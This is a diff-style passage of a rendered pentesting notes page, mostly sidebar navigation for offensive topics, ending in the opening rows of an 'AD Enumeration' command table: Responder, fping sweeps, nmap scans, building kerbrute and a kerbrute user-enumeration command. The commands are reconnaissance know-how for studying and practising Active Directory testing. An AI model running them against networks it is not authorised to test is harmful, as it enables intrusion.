+            <span class="md-nav__icon md-icon"></span>
+            C2
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/c2/c2-01-sliver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sliver
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3_9" id="__nav_4_2_3_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Footprinting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_3_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3_9">
+            <span class="md-nav__icon md-icon"></span>
+            Footprinting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/footprinting/footprinting-00-all/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Footprinting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3_10" id="__nav_4_2_3_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Privilege escalation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_3_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3_10">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege escalation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/privilege-escalation/privesc-01-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/privilege-escalation/privesc-02-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3_11" id="__nav_4_2_3_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tools
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_3_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3_11">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/tools/tools-001-ffuf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FFUF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_4" id="__nav_4_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Internal
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Internal
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../internal/inpt-01-network-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../internal/inpt-02-domain-data/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Domain Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../internal/inpt-03-domain-vuln-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Domain Vulnerability Scanning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../internal/inpt-04-smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_5" id="__nav_4_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    AD Enumeration
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    AD Enumeration
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#llmnrntb-ns-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      LLMNR/NTB-NS Poisoning
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying-password-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      Password Spraying &amp; Password Policies
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumerating-security-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerating Security Controls
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credentialed-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credentialed Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-by-living-off-the-land" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration by Living Off the Land
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transfering-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Transfering Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kerberoasting
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acl-enumeration-tactics" class="md-nav__link">
+    <span class="md-ellipsis">
+      ACL Enumeration &amp; Tactics
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCSync
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privileged-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privileged Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nopac" class="md-nav__link">
+    <span class="md-ellipsis">
+      NoPac
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printnightmare" class="md-nav__link">
+    <span class="md-ellipsis">
+      PrintNightmare
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      PetitPotam
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#miscellaneous-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Miscellaneous Misconfigurations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group-policy-enumeration-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Group Policy Enumeration &amp; Attacks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      ASREPRoasting
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-child-parent-trusts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Trust Relationships - Child &gt; Parent Trusts
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-cross-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Trust Relationships - Cross-Forest
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-002-ldap-powerview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LDAP and PowerView
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-003-lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lateral Movement
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-004-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-005-dacl-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DACL Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-006-ntlm-relay/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NTLM Relay Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-007-ad-trust-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AD Trust Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-008-evasion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-009-mssql-exchange-sccm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MSSQL, Exchange, and SCCM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../infra-010-windows-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_6" id="__nav_4_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Wifi
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            Wifi
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wifi/wifi-01-wifi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pentesting Wi-Fi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Web
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_3" id="__nav_4_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_2" id="__nav_4_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Checklists
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Checklists
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-01-information-gathering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Information Gathering
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-02-configuration-management-deployment-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Configuration and Deployment Management Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-03-identity-management-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Identity Management Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-04-authentication-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Authentication Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-05-authorization-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Authorization Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-06-session-management-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session Management Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-07-input-validation-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Input Validation Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-08-error-handling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Testing for Error Handling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-09-testing-weak-cryptography/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Testing for Weak Cryptography
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-10-business-logic-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Business Logic Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-11-client-side-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Client Side Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/checklists/wstg-12-api-testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    API Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_3" id="__nav_4_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/notes/webnotes-00-information-gathering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Information Gathering
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/notes/webnotes-01-xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cross-Site Scripting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/notes/webnotes-02-sqli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/notes/webnotes-03-command-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/notes/webnotes-04-cors/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#llmnrntb-ns-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      LLMNR/NTB-NS Poisoning
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying-password-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      Password Spraying &amp; Password Policies
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumerating-security-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumerating Security Controls
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credentialed-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credentialed Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-by-living-off-the-land" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration by Living Off the Land
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transfering-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Transfering Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kerberoasting
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acl-enumeration-tactics" class="md-nav__link">
+    <span class="md-ellipsis">
+      ACL Enumeration &amp; Tactics
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCSync
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privileged-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privileged Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nopac" class="md-nav__link">
+    <span class="md-ellipsis">
+      NoPac
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printnightmare" class="md-nav__link">
+    <span class="md-ellipsis">
+      PrintNightmare
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      PetitPotam
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#miscellaneous-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Miscellaneous Misconfigurations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group-policy-enumeration-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Group Policy Enumeration &amp; Attacks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      ASREPRoasting
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-child-parent-trusts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Trust Relationships - Child &gt; Parent Trusts
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-cross-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      Trust Relationships - Cross-Forest
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="ad-enumeration">AD Enumeration</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nslookup ns1.example.com</code></td>
+<td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo tcpdump -i ens224</code></td>
+<td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo responder -I ens224 -A</code></td>
+<td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the <code>-I</code> option and operating in <code>Passive Analysis</code>mode which is activated using <code>-A</code>. Performed from a Linux-based host</td>
+</tr>
+<tr>
+<td><code>fping -asgq 172.16.5.0/23</code></td>
+<td>Performs a ping sweep on the specified network segment from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td>
+<td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td>
+</tr>
+<tr>
+<td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td>
+<td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>make help</code></td>
+<td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo make all</code></td>
+<td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td>
+</tr>
+<tr>
+<td><code>./kerbrute_linux_amd64</code></td>
+<td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td>
+<td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.</td>
+</tr>
+<tr>
+<td><code>./kerbrute_linux_amd64 userenum -d example.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td>
